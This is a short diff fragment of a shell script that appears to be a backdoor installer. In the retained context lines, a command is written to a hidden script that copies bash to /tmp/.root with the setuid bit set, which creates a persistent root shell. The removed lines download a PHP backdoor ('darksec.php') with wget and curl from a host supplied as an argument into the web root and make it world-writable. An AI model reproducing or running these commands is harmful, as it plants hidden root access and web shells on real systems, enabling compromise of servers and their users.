@@ -34,10 +34,6 @@ else
           echo "cp /bin/bash /tmp/.root && chmod +xs /tmp/.root" >> /usr/local/bin/.root.sh
                     sleep 1
 
-          # CHANGE DIRETORY WEB INSTALL BACKDOOR.PHP
-
-          cd /var/www/html/ && wget -q http://$1//darksec.php &&  curl -s http://$1//darksec.php -o darksec.php && chmod 777 /var/www/html/darksec.php
-
           #BACK DIretory
           cd $darksec
 
